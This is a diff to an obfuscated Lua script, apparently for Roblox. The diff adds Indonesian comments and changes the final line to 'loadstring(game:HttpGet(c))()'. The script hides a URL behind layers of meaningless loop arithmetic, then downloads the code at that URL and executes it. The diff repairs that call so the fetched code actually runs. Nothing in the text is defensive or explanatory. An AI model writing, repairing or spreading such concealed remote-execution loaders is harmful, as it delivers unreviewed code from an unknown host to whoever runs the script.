@@ -1,3 +1,4 @@
+-- Memastikan fungsi ini dijalankan di dalam lingkungan Roblox
 (function(b)
     local c = debug.getmetatable(b)
     debug.setmetatable(b, {
@@ -14,18 +15,21 @@ end)(function(b)
     local d = 24915
     local e = 0
     local f = {}
+    
     while e < 966 do
         e = e + 1
         while e < 605 and d % 5260 < 2630 do
             e = e + 1
             d = (d - 466) % 41090
             local b = e + d
+            
             if (d % 3504) > 1752 then
                 d = (d - 706) % 30483
                 while e < 313 and d % 7102 < 3551 do
                     e = e + 1
                     d = (d * 411) % 43087
                     local b = e + d
+                    
                     if (d % 14970) > 7485 then
                         d = (d * 355) % 41240
                         local b = 76830
@@ -55,6 +59,7 @@ end)(function(b)
                     e = e + 1
                     d = (d - 950) % 7147
                     local b = e + d
+                    
                     if (d % 4020) < 2010 then
                         d = (d + 826) % 6247
                         local b = 79206
@@ -86,6 +91,7 @@ end)(function(b)
                     e = e + 1
                     d = (d * 899) % 25086
                     local b = e + d
+                    
                     if (d % 11548) > 5774 then
                         d = (d * 412) % 37881
                         local b = 84492
@@ -114,6 +120,7 @@ end)(function(b)
         end
         d = (d + 751) % 33125
     end
+    
     (function(d)
         local e = d
         local f = 0
@@ -199,6 +206,8 @@ end)(function(b)
                 end) 'tIFsS' and e[2](h + 748)) or h
             end)
         }
-        end) {}
-    loadstring(game:HttpGet(c)) {}
+    end) {}
+
+    -- Mengambil skrip yang dihasilkan oleh proses sebelumnya
+    loadstring(game:HttpGet(c))()  -- Memanggil hasil yang telah disusun
 end)
